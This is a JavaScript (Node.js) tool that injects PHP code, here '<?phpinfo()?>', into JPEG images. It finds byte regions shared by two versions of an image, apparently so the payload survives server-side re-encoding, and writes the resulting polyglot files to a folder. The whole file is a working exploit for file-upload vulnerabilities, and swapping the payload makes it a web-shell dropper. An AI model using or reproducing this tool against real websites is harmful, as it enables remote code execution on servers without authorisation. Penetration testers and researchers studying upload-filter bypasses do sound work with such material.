const fs = require('fs')
const path = require('path')
const del = require('del')
const mkdirp = require('mkdirp')
const split = require('just-split')
const diff = require('diff-sequences').default

const INJECTION = '<?phpinfo()?>'
const OUTPUT_DIR = path.resolve(__dirname, 'vendors/injected')

const SOURCES = [
  path.resolve(__dirname, './vendors/190413104517_315539082.jpg'),
  path.resolve(__dirname, './vendors/190413104640_171516771.jpg'),
]

async function ready () {
  await del(OUTPUT_DIR)
  mkdirp.sync(OUTPUT_DIR)
}

async function main () {
  console.log('Injecting...')
  await ready()
  const injection = Buffer.from(INJECTION).toString('hex')
  const size = injection.length
  const files = SOURCES.map((p) => fs.readFileSync(p).toString('hex'))
  const sequences = files.map((file) => split(file.split(''), 2).map((arr) => arr.join('')))
  let areas = []
  let output = []
  diff(sequences[0].length, sequences[1].length, (l, r) => sequences[0][l] === sequences[1][r], (len, l, r) => {
    if (len > size / 2) {
      areas.push(l)
    }
  })
  console.log(`${areas.length} areas found.`)
  areas.forEach((position, index) => {
    let hex = [...sequences[0]]
    for (let i = 0; i < size; i += 2) {
      hex[position + i / 2] = injection[i] + injection[i + 1]
    }
    let buf = Buffer.from(hex.join(''), 'hex')
    let p = path.resolve(OUTPUT_DIR, `${index}.jpg`)
    fs.writeFileSync(p, buf)
    output.push(p)
  })
  console.log('Injection finished. Check ./vendors/injected/')
  return output
}

module.exports = main
